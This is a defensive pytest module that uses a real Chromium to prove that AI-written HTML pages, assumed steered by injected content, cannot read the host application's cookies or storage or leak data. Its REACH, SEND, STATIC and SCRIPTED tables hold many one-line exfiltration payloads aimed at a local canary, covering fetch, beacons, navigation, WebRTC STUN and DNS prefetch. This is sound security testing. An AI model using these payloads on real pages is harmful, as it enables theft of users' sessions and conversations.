"""A page a model wrote reaches nothing and sends nothing (harness spec 3.8.0,
`pages.md` §6): proved in a real Chromium, not argued.

A page in an answer is HTML that anything the model read may have steered. Two
things must hold. It cannot **reach** the application that shows it: its
document, its cookie, its storage. And it cannot **send** anything anywhere --
a page that could would carry a conversation out of the instance in an
address.

The rig is three small servers and a browser:

- the **site**: a framing page under the application's own policy
  (`hardening.CONTENT_SECURITY_POLICY`), with one frame per attempt. Each
  attempt is a hostile page put through exactly what a real one goes through:
  rebuilt by `html_pages.document`, served under `sealed.page_headers()`,
  framed with an empty `sandbox`;
- the **canary**: a listener (TCP and UDP) on this machine, and names that
  resolve nowhere. Every attempt tries to make the browser touch one;
- **controls**: the same attempts from a page under no policy. They must reach
  the canary, or a quiet canary would prove nothing.

**Why a page runs no script** is measured here too (`scripted_*`): the same
policy with scripts allowed keeps everything in -- except a peer connection's
STUN request and a name looked up for a link hint, which no policy of a web
page refuses. Should a browser close both, `test_why_no_script_runs` says so.

Slow (a browser): run it through `heavy-guard`, by itself.
"""

# ruff: noqa: E501 -- the attempts are one line of JavaScript each, kept whole
from __future__ import annotations

import contextlib
import importlib.util
import json
import shutil
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from lembas.security import hardening, sealed
from lembas.services import html_pages

CHROMIUM = shutil.which("chromium") or shutil.which("chromium-browser")
pytestmark = [
    pytest.mark.slow,
    pytest.mark.skipif(not CHROMIUM, reason="needs a Chromium to prove it in"),
]

SECRET = "session-cookie-of-the-application"
SEND_FETCH = "fetch(C + '/' + NAME, {mode: 'no-cors'}).catch(function(){});"
WEBRTC = (
    "attempt(function(){ var p = new RTCPeerConnection({iceServers: [{urls: 'stun:' + H + ':' + U}]});"
    " p.createDataChannel('x'); p.createOffer().then(function(o){ return p.setLocalDescription(o); }).catch(function(){}); });"
)
# A name that resolves nowhere: seeing it looked up is the leak.
DNS_SEALED = "sealed-page-canary.invalid"
DNS_CONTROL = "control-page-canary.invalid"
DNS_SCRIPTED = "scripted-page-canary.invalid"

# What the policy would be if a page's scripts ran: the reason they do not.
SCRIPTED_POLICY = (
    sealed.page_policy()
    .replace("sandbox;", "sandbox allow-scripts;")
    .replace("script-src 'none'", "script-src 'unsafe-inline'")
)
SCRIPTED = {
    "scripted_fetch": SEND_FETCH,
    "scripted_parent": "attempt(function(){ return 'read: ' + parent.document.title; });",
    "scripted_navigate": "location = C + '/' + NAME;",
    "scripted_webrtc": WEBRTC,
    "scripted_dns": (
        "var l = document.createElement('link'); l.rel = 'dns-prefetch';"
        f" l.href = '//{DNS_SCRIPTED}'; document.head.appendChild(l); report('ran');"
    ),
}

REPORT = """
<script>
function report(value) { parent.postMessage({name: NAME, value: String(value)}, '*'); }
function attempt(run) {
  try { var r = run(); if (r !== undefined) report(r); }
  catch (e) { report('refused: ' + e.name); }
}
</script>
"""

# --- What a hostile page tries. `C` is the canary's address, `U` its UDP port,
# `H` its host; `NAME` the attempt's name (also in the address it asks for). --------
REACH = {
    "parent_document": "attempt(function(){ return 'read: ' + parent.document.title; });",
    "top_document": "attempt(function(){ return 'read: ' + top.document.cookie; });",
    "cookie": "attempt(function(){ return 'read: ' + document.cookie; });",
    "local_storage": "attempt(function(){ localStorage.setItem('a','b'); return 'read: wrote'; });",
    "session_storage": "attempt(function(){ return 'read: ' + sessionStorage.length; });",
    "indexed_db": "attempt(function(){ indexedDB.open('x'); return 'read: opened'; });",
    "parent_fetch": (
        "fetch('/secret', {credentials: 'include'}).then(function(r){ return r.text(); })"
        ".then(function(t){ report('read: ' + t); }, function(e){ report('refused: ' + e.name); });"
    ),
    "top_navigation": (
        "attempt(function(){ top.location = C + '/top_navigation'; return 'asked'; });"
    ),
    "popup": "attempt(function(){ var w = window.open(C + '/popup'); return w ? 'read: opened' : 'refused: null'; });",
}

SEND = {
    "fetch": SEND_FETCH,
    "xhr": "attempt(function(){ var x = new XMLHttpRequest(); x.open('GET', C + '/' + NAME); x.send(); });",
    "websocket": "attempt(function(){ new WebSocket(C.replace('http', 'ws') + '/' + NAME); });",
    "beacon": "attempt(function(){ navigator.sendBeacon(C + '/' + NAME, 'x'); });",
    "event_source": "attempt(function(){ new EventSource(C + '/' + NAME); });",
    "image": "new Image().src = C + '/' + NAME;",
    "script": "var s = document.createElement('script'); s.src = C + '/' + NAME; document.head.appendChild(s);",
    "import": "import(C + '/' + NAME).catch(function(){});",
    "stylesheet": "var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = C + '/' + NAME; document.head.appendChild(l);",
    "css_import": "var s = document.createElement('style'); s.textContent = '@import url(' + C + '/' + NAME + ');'; document.head.appendChild(s);",
    "css_background": "document.body.style.background = 'url(' + C + '/' + NAME + ')';",
    "font": "var s = document.createElement('style'); s.textContent = '@font-face{font-family:x;src:url(' + C + '/' + NAME + ')} body{font-family:x}'; document.head.appendChild(s); document.body.appendChild(document.createTextNode('text'));",
    "prefetch": "var l = document.createElement('link'); l.rel = 'prefetch'; l.href = C + '/' + NAME; document.head.appendChild(l);",
    "preload": "var l = document.createElement('link'); l.rel = 'preload'; l.as = 'fetch'; l.href = C + '/' + NAME; document.head.appendChild(l);",
    "preconnect": "var l = document.createElement('link'); l.rel = 'preconnect'; l.href = C + '/' + NAME; document.head.appendChild(l);",
    "icon": "var l = document.createElement('link'); l.rel = 'icon'; l.href = C + '/' + NAME; document.head.appendChild(l);",
    "video": "var v = document.createElement('video'); v.src = C + '/' + NAME; v.poster = C + '/' + NAME + '_poster'; document.body.appendChild(v); v.load();",
    "audio": "var a = new Audio(C + '/' + NAME); a.load();",
    "svg_image": "document.body.insertAdjacentHTML('beforeend', '<svg><image href=\"' + C + '/' + NAME + '\"/></svg>');",
    "input_image": "document.body.insertAdjacentHTML('beforeend', '<input type=image src=\"' + C + '/' + NAME + '\">');",
    "object": "document.body.insertAdjacentHTML('beforeend', '<object data=\"' + C + '/' + NAME + '\"></object>');",
    "embed": "document.body.insertAdjacentHTML('beforeend', '<embed src=\"' + C + '/' + NAME + '\">');",
    "frame": "var f = document.createElement('iframe'); f.src = C + '/' + NAME; document.body.appendChild(f);",
    "frame_srcdoc": "var f = document.createElement('iframe'); f.srcdoc = '<img src=\"' + C + '/' + NAME + '\">'; document.body.appendChild(f);",
    "worker": "attempt(function(){ var b = new Blob(['fetch(\"' + C + '/' + NAME + '\")']); new Worker(URL.createObjectURL(b)); });",
    "eval": "attempt(function(){ eval('fetch(C + \"/\" + NAME).catch(function(){})'); });",
    "form": "var f = document.createElement('form'); f.action = C + '/' + NAME; f.method = 'get'; document.body.appendChild(f); attempt(function(){ f.submit(); });",
    "form_post": "var f = document.createElement('form'); f.action = C + '/' + NAME; f.method = 'post'; f.target = '_blank'; document.body.appendChild(f); attempt(function(){ f.submit(); });",
    # The frame taking itself somewhere else: what a document's own policy
    # cannot refuse, and the framing page's `frame-src` must.
    "navigate_location": "location = C + '/' + NAME;",
    "navigate_assign": "location.assign(C + '/' + NAME);",
    "navigate_replace": "location.replace(C + '/' + NAME);",
    "navigate_link": "var a = document.createElement('a'); a.href = C + '/' + NAME; document.body.appendChild(a); a.click();",
    "navigate_link_blank": "var a = document.createElement('a'); a.href = C + '/' + NAME; a.target = '_blank'; document.body.appendChild(a); a.click();",
    "navigate_link_top": "var a = document.createElement('a'); a.href = C + '/' + NAME; a.target = '_top'; document.body.appendChild(a); a.click();",
    "navigate_meta": "document.head.insertAdjacentHTML('beforeend', '<meta http-equiv=\"refresh\" content=\"0;url=' + C + '/' + NAME + '\">');",
    "navigate_data": "location = 'data:text/html,<img src=\"' + C + '/' + NAME + '\">';",
    "navigate_blob": "location = URL.createObjectURL(new Blob(['<img src=\"' + C + '/' + NAME + '\">'], {type: 'text/html'}));",
    "navigate_history": "attempt(function(){ history.pushState({}, '', '/elsewhere'); location.reload(); });",
    "webrtc": WEBRTC,
}

# Written into the document, not made by a script: a page with no script at
# all can still ask for these.
STATIC = {
    "static_meta": '<meta http-equiv="refresh" content="0;url={C}/static_meta">',
    "static_image": '<img src="{C}/static_image">',
    "static_stylesheet": '<link rel="stylesheet" href="{C}/static_stylesheet">',
    "static_prefetch": '<link rel="prefetch" href="{C}/static_prefetch"><link rel="preconnect" href="{C}">',
    "static_base": '<base href="{C}/"><img src="static_base">',
    "static_dns": f'<link rel="dns-prefetch" href="//{DNS_SEALED}"><a href="http://{DNS_SEALED}/">x</a>',
}


class Canary:
    """Whatever touches it, it remembers: the first line of a TCP request, and
    that a datagram came."""

    def __init__(self) -> None:
        self.seen: list[str] = []
        self.datagrams = 0
        self.tcp = socket.socket()
        self.tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.tcp.bind(("0.0.0.0", 0))
        self.tcp.listen(64)
        self.port = self.tcp.getsockname()[1]
        # Two UDP ports: one the sealed pages are given, one the controls --
        # a datagram says by where it lands which of them sent it.
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.bind(("0.0.0.0", 0))
        self.udp_port = self.udp.getsockname()[1]
        self.udp_control = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp_control.bind(("0.0.0.0", 0))
        self.udp_control_port = self.udp_control.getsockname()[1]
        self.control_datagrams = 0
        self.udp_scripted = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp_scripted.bind(("0.0.0.0", 0))
        self.udp_scripted_port = self.udp_scripted.getsockname()[1]
        self.scripted_datagrams = 0
        self.open = True
        threading.Thread(target=self._tcp, daemon=True).start()
        threading.Thread(target=self._udp, args=(self.udp, "datagrams"), daemon=True).start()
        threading.Thread(
            target=self._udp, args=(self.udp_control, "control_datagrams"), daemon=True
        ).start()
        threading.Thread(
            target=self._udp, args=(self.udp_scripted, "scripted_datagrams"), daemon=True
        ).start()

    def _tcp(self) -> None:
        while self.open:
            try:
                connection, _ = self.tcp.accept()
            except OSError:
                return
            with connection:
                connection.settimeout(2)
                try:
                    first = connection.recv(2048).split(b"\r\n", 1)[0].decode("latin-1")
                except OSError:
                    first = ""
                self.seen.append(first or "(a connection that said nothing)")
                with contextlib.suppress(OSError):
                    connection.sendall(
                        b"HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\n"
                        b"Content-Type: text/plain\r\nContent-Length: 2\r\n"
                        b"Connection: close\r\n\r\nok"
                    )

    def _udp(self, listener: socket.socket, count: str) -> None:
        while self.open:
            try:
                listener.recvfrom(2048)
            except OSError:
                return
            setattr(self, count, getattr(self, count) + 1)

    def close(self) -> None:
        self.open = False
        self.tcp.close()
        self.udp.close()
        self.udp_control.close()
        self.udp_scripted.close()

    def names(self) -> set[str]:
        out = set()
        for line in self.seen:
            parts = line.split(" ")
            # `GET /name?x HTTP/1.1` is `name`; a connection that sent nothing
            # (a preconnect) is kept as the sentence it was recorded as.
            named = len(parts) > 2 and parts[1].startswith("/")
            out.add(parts[1].lstrip("/").split("?", 1)[0] if named else line)
        return out


def _address() -> str:
    """This machine's own address on its network, found without sending
    anything: WebRTC does not gather candidates for the loopback alone."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("192.0.2.1", 9))  # TEST-NET-1: never routed, nothing is sent
        return probe.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        probe.close()


def _hostile(name: str, canary: str, host: str, udp: int, body: str, static: str = "") -> str:
    """What a model steered against the person would write."""
    return (
        "<!doctype html><html><head><meta charset=utf-8><title>page</title>"
        f"<script>var NAME = {json.dumps(name)}, C = {json.dumps(canary)}, "
        f"H = {json.dumps(host)}, U = {udp};</script>{REPORT}{static}</head>"
        f"<body><p>{name}</p><script>{body}</script></body></html>"
    )


def _served(name: str, hostile: str) -> bytes:
    """A page as the application serves it: rebuilt (`html_pages.document`)."""
    return html_pages.document(html_pages.Page(name, hostile)).encode()


class Site:
    """`/` frames every attempt under the real policies; `/open` frames the
    controls under none."""

    def __init__(self, canary: Canary) -> None:
        host = _address()
        self.canary_url = f"http://{host}:{canary.port}"
        attempts = {**REACH, **SEND}
        pages: dict[str, bytes] = {}
        for name, body in attempts.items():
            pages[name] = _served(
                name, _hostile(name, self.canary_url, host, canary.udp_port, body)
            )
        for name, static in STATIC.items():
            pages[name] = _served(name, _hostile(
                name, self.canary_url, host, canary.udp_port, "",
                static.replace("{C}", self.canary_url),
            ))
        # The same policy with scripts allowed, served as written.
        for name, body in SCRIPTED.items():
            pages[name] = _hostile(
                name, self.canary_url, host, canary.udp_scripted_port, body
            ).encode()
        # The controls: the same attempts, named apart, under no policy.
        self.controls = ["fetch", "image", "navigate_location", "webrtc", "form", "static_meta"]
        for name in self.controls:
            pages["control_" + name] = _hostile(
                "control_" + name, self.canary_url, host, canary.udp_control_port,
                attempts.get(name, ""),
                STATIC.get(name, "").replace("{C}", self.canary_url).replace(
                    "static_meta", "control_static_meta"
                ),
            ).encode()
        pages["control_dns"] = (
            f'<!doctype html><link rel="dns-prefetch" href="//{DNS_CONTROL}">'
            f'<img src="http://{DNS_CONTROL}/x">'
        ).encode()
        self.names = [n for n in pages if not n.startswith("control_")]
        collect = (
            "<script>window.__got = {}; window.__frames = {};"
            "window.addEventListener('message', function (e) {"
            "  if (e.data && e.data.name) window.__got[e.data.name] = e.data.value; });"
            "</script>"
        )

        def framing(names: list[str], sandbox: str) -> bytes:
            frames = "".join(
                "<iframe {} name=\"{}\" src=\"/page/{}\" width=\"200\" height=\"60\"></iframe>".format(
                    'sandbox="allow-scripts"' if n.startswith("scripted_") else sandbox, n, n
                )
                for n in names
            )
            return (
                f"<!doctype html><html><head><title>the application</title>{collect}</head>"
                f"<body>{frames}</body></html>"
            ).encode()

        sealed_parent = framing(self.names, 'sandbox=""')
        open_parent = framing(["control_" + n for n in self.controls] + ["control_dns"], "")
        site = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_args) -> None:
                pass

            def _send(self, body: bytes, headers: dict[str, str]) -> None:
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                for key, value in headers.items():
                    self.send_header(key, value)
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self) -> None:
                path = self.path.split("?", 1)[0]
                if path == "/":
                    self._send(sealed_parent, {
                        "Content-Security-Policy": hardening.CONTENT_SECURITY_POLICY,
                        "Set-Cookie": f"session={SECRET}; Path=/; SameSite=Lax",
                    })
                elif path == "/open":
                    self._send(open_parent, {})
                elif path == "/secret":
                    cookie = self.headers.get("Cookie") or ""
                    self._send(f"cookie seen: {cookie}".encode(), {})
                elif path.startswith("/page/"):
                    name = path[len("/page/"):]
                    site.served.append(name)
                    policy = {} if name.startswith("control_") else sealed.page_headers()
                    if name.startswith("scripted_"):
                        policy = {**policy, "Content-Security-Policy": SCRIPTED_POLICY}
                    self._send(pages.get(name, b"missing"), policy)
                else:
                    site.strays.append(path)
                    self._send(b"elsewhere", {})

        self.served: list[str] = []
        self.strays: list[str] = []
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.base = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


def _browser_class():
    path = Path(__file__).resolve().parent.parent / "scripts" / "perf_measure.py"
    spec = importlib.util.spec_from_file_location("perf_measure", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.Browser


@pytest.fixture(scope="module")
def run(tmp_path_factory):
    """Everything is tried once; the tests read what happened."""
    netlog = tmp_path_factory.mktemp("netlog") / "net.json"
    canary = Canary()
    site = Site(canary)
    browser = _browser_class()(args=(f"--log-net-log={netlog}", "--net-log-capture-mode=Everything"))
    try:
        # Controls first: the canary must hear a page that nothing holds back.
        browser.call("Page.navigate", url=f"{site.base}/open")
        deadline = time.monotonic() + 20
        while time.monotonic() < deadline:
            heard = canary.names()
            if {"control_fetch", "control_image", "control_navigate_location"} <= heard:
                break
            time.sleep(0.2)
        time.sleep(4)  # the slower ones: a refresh, a peer connection
        controls = set(canary.names())
        canary.seen.clear()

        browser.call("Page.navigate", url=f"{site.base}/")
        browser.wait_for("document.readyState === 'complete'", timeout=30)
        time.sleep(8)  # every attempt has had its time, and any refresh has fired
        got = browser.js("JSON.stringify(window.__got)")
        title = browser.js("document.title")
        tree = browser.call("Page.getFrameTree")["frameTree"]
        frames = {
            child["frame"].get("name", ""): child["frame"].get("url", "")
            for child in tree.get("childFrames", [])
        }
        top = tree["frame"]["url"]
        targets = browser.call("Target.getTargets")["targetInfos"]
    finally:
        browser.close()
        site.close()
        heard = set(canary.names())
        datagrams, control_datagrams = canary.datagrams, canary.control_datagrams
        scripted_datagrams = canary.scripted_datagrams
        canary.close()
    time.sleep(1)
    log = netlog.read_text(errors="replace") if netlog.exists() else ""
    return {
        "controls": controls, "control_datagrams": control_datagrams,
        "scripted_datagrams": scripted_datagrams,
        "heard": heard, "datagrams": datagrams, "got": json.loads(got or "{}"),
        "title": title, "frames": frames, "top": top, "site": site, "netlog": log,
        "pages": [t for t in targets if t.get("type") == "page"],
    }


def test_the_controls_reach_the_canary(run):
    """Without the policies the same attempts get out -- so silence under them
    means something."""
    assert {"control_fetch", "control_image", "control_navigate_location",
            "control_form"} <= run["controls"], run["controls"]
    assert "control_static_meta" in run["controls"], run["controls"]


def test_every_attempt_was_served(run):
    assert set(run["site"].names) <= set(run["site"].served)


def test_no_script_of_a_page_runs(run):
    """Every attempt is a script; none reported back. (The frames whose
    policy was loosened for the comparison did: the reporting works.)"""
    ran = {name for name in run["got"] if not name.startswith("scripted_")}
    assert ran == set(), ran
    assert "scripted_dns" in run["got"], run["got"]


def test_a_page_reaches_nothing_of_the_application(run):
    """Also with its scripts running, which they do not: an empty `sandbox`
    and the policy's make the frame an origin of its own."""
    got = run["got"]
    reached = {name: value for name, value in got.items() if value.startswith("read")}
    assert reached == {}, reached
    assert SECRET not in json.dumps(got)
    # The framing page was not navigated, and nothing opened beside it.
    assert run["top"].rstrip("/") == run["site"].base and run["title"] == "the application"
    assert len(run["pages"]) == 1, run["pages"]


def test_a_page_sends_nothing_anywhere(run):
    """Not by a request of any kind, and not by taking itself somewhere --
    the scripted comparison included, for everything a policy does refuse."""
    assert run["heard"] == set(), sorted(run["heard"])
    moved = {
        name: url for name, url in run["frames"].items()
        if run["site"].canary_url in url
    }
    assert moved == {}, moved


def test_a_page_opens_no_peer_connection(run):
    assert run["datagrams"] == 0


def test_a_page_looks_up_no_name(run):
    """A link hint (`dns-prefetch`, `preconnect`) has the browser resolve a
    name whatever the policy says. The rebuilt page has no such element."""
    if DNS_CONTROL not in run["netlog"]:
        pytest.skip("the browser's network log did not record the control's lookup")
    assert DNS_SEALED not in run["netlog"]


def test_why_no_script_runs(run):
    """With scripts allowed under the very same policy, a page still gets
    something out: a STUN request to a server of its choosing, and a lookup
    of a name of its choosing. That is why a page is shown static. If this
    browser has closed both, scripts in pages can be thought about again."""
    out = []
    if run["scripted_datagrams"]:
        out.append("a peer connection's STUN request")
    if DNS_SCRIPTED in run["netlog"]:
        out.append("a name looked up for a link a script added")
    if not out:
        pytest.skip("this browser let neither out: scripts in pages can be reconsidered")
    assert out
